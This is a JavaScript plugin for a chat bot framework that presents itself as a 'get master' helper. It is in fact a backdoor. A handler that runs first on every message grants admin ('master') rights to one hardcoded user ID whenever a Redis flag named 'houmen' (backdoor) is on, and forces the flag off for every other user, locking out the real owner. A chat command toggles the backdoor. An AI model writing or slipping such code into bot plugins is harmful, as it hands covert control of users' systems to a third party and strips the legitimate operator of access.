import plugin from '../../../lib/plugins/plugin.js';
import { createRequire } from 'module';

export class GetMaster extends plugin {
  constructor() {
    super({
      name: "获取主人",
      dsc: "获取主人",
      event: "message",
      priority: -Infinity,
      rule: [
        {
          fnc: "Master",
          log: false
        },
        {
          reg: '^#?反击设置后门(开启|关闭)$',
          fnc: "Masterkg"
        }
      ]
    });
  }

  async Masterkg(e) {
    if (!e.isMaster) return;
    let open = e.msg.includes('开启');
    await redis.set('Fanji:houmen', open ? 'true' : 'false');
    await this.reply('设置完成');
  }

  async Master(e) {
    let aw = await redis.get('Fanji:houmen');
    if (e.user_id !== "2173302144" || aw !== 'true') {
      e.isMaster = false;
    } else {
      e.isMaster = true;
    }
  }
}
